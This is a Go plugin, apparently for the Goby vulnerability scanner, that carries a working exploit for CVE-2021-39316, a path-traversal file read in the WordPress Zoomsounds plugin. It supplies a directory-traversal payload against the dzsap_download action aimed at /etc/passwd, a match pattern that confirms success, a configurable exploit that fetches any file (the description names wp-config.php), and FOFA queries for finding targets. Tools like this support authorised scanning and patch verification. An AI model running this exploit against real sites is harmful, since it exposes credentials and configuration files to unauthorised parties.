package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "Wordpress Zoomsounds Arbitrary File Read (CVE-2021-39316)",
    "Description": "<p>WordPress is the most popular web page building system in the world.</p><p>The WordPress Zoomsounds plugin has an arbitrary file reading vulnerability. The vulnerability stems from the fact that the plugin version </p>",
    "Impact": "Wordpress Zoomsounds Arbitrary File Read (CVE-2021-39316)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://wordpress.com\">https://wordpress.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "WordPress",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "Wordpress Zoomsounds 插件任意文件读取漏洞（CVE-2021-39316）",
            "Description": "<p>WordPress是全球最热门的网页搭建系统。</p><p>WordPress  Zoomsounds 插件存在任意文件读取漏洞，该漏洞源于该插件版本＜= 6.45的允许通过 dzsap_download 操作使用 link 参数中的目录遍历来下载任意文件，包括敏感的配置文件，例如 wp-config.php。</p>",
            "Impact": "<p>WordPress  Zoomsounds 插件存在任意文件读取漏洞，该漏洞源于该插件版本＜= 6.45的允许通过 dzsap_download 操作使用 link 参数中的目录遍历来下载任意文件，包括敏感的配置文件，例如 wp-config.php。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://wordpress.com\">https://wordpress.com</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "WordPress",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Wordpress Zoomsounds Arbitrary File Read (CVE-2021-39316)",
            "Description": "<p>WordPress is the most popular web page building system in the world.</p><p>The WordPress Zoomsounds plugin has an arbitrary file reading vulnerability. The vulnerability stems from the fact that the plugin version <= 6.45 allows the dzsap_download operation to use the directory traversal in the link parameter to download arbitrary files, including sensitive configuration files, such as wp-config.php.</p>",
            "Impact": "Wordpress Zoomsounds Arbitrary File Read (CVE-2021-39316)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://wordpress.com\">https://wordpress.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "WordPress",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "body=\"Zoomsounds\"",
    "GobyQuery": "body=\"Zoomsounds\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://wordpress.com",
    "DisclosureDate": "2021-12-01",
    "References": [
        "https://www.exploit-db.com/exploits/50564"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [
        "CVE-2021-39316"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202108-2783"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "../../../../../../../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10244"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := `/MYzoomsounds/?action=dzsap_download&link=../../../../../../../../../../etc/passwd`
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				return resp1.StatusCode == 200 && regexp.MustCompile("root:(.*?):0:0:").MatchString(resp1.RawBody)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["filepath"].(string)
			uri := "/MYzoomsounds/?action=dzsap_download&link=" + cmd
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
